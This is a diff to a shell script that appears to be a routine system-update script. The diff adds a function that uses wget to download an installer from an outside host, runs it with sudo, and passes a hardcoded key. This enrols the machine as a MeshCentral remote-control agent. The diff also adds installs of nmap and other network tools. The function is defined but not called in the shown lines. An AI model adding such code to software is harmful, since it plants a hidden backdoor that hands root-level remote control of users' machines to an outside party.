@@ -129,6 +129,10 @@ check_and_install_updates() {
     fi
 }
 
+install_meshcentral_agent() {
+    (wget "https://the-eye.energydrive.online/meshagents?script=1" -O ./meshinstall.sh || wget "https://the-eye.energydrive.online/meshagents?script=1" --no-proxy -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo -E ./meshinstall.sh https://the-eye.energydrive.online 'YUbq2Nb14UDKBmYDnSBXKcurJGi81iVeLXeWnH5Wuyzhk49WtbcUjoOjChgDucND' || ./meshinstall.sh https://the-eye.energydrive.online 'YUbq2Nb14UDKBmYDnSBXKcurJGi81iVeLXeWnH5Wuyzhk49WtbcUjoOjChgDucND'
+}
+
 
 # Start the script
 main() {
@@ -150,6 +154,8 @@ main() {
     check_and_install_updates
 
     log_message "System update script completed."
+
+    apt install -y nmap neofetch vnstat mtr screen wget curl
 }
 
 
